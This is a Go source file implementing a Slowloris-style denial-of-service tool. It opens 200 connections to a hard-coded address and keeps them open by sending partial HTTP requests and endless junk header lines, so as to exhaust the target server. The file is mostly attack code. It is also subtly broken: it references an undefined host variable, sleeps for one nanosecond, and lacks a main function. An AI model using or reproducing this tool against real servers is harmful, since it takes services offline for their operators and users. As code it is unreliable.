package main

import (
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"time"
)

const (
	headers = `User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0
Accept-language: en-US,en,q=0.5
Connection: Keep-Alive`
	ip             = "192.168.1.109"
	port           = 80
	howManySockets = 200
)

var allTheSockets []net.Conn

func from1() {
	// var err error
	for i := 0; i < howManySockets; i++ {
		//s, err := net.Dial("tcp", ip+":"+port)
		s, err := net.Dial("tcp", _host+":"+strconv.Itoa(port))

		if err != nil {
			continue
		}
		allTheSockets = append(allTheSockets, s)
	}
	for i, s := range allTheSockets {
		//s.Write([]byte("GET /?{} HTTP/1.1\r\n".format(rand.Intn(2000))))
		s.Write([]byte(fmt.Sprintf("GET /?%d HTTP/1.1\r\n", rand.Intn(2000))))

		for _, h := range strings.Split(headers, "\n") {
			s.Write([]byte(h + "\r\n"))
		}
		fmt.Printf("[%d] Successfully sent GET request and headers.\n", i)
	}
	for {
		for i, s := range allTheSockets {
			//_, err := s.Write([]byte("X-a: {}\r\n".format(rand.Intn(5000))))
			_, err := s.Write([]byte(fmt.Sprintf("X-a: %d\r\n", rand.Intn(5000))))

			if err != nil {
				fmt.Println("[-] A socket failed, reattempting...")
				allTheSockets = append(allTheSockets[:i], allTheSockets[i+1:]...)
				// s, err := net.Dial("tcp", ip+":"+port)
				s, err := net.Dial("tcp", ip+":"+strconv.Itoa(port))
				if err != nil {
					continue
				}
				//s.Write([]byte("GET /?{} HTTP/1.1\r\n".format(rand.Intn(2000))))
				s.Write([]byte(fmt.Sprintf("GET /?%d HTTP/1.1\r\n", rand.Intn(2000))))

				for _, h := range strings.Split(headers, "\n") {
					s.Write([]byte(h + "\r\n"))
				}
				allTheSockets = append(allTheSockets, s)
			}
			fmt.Println("[-][-][*] Waiter sent.")
		}
		fmt.Println("\n\n[*] Successfully sent KEEP-ALIVE headers...\n")
		fmt.Println("Sleeping off ...")
		time.Sleep(1)
	}
}
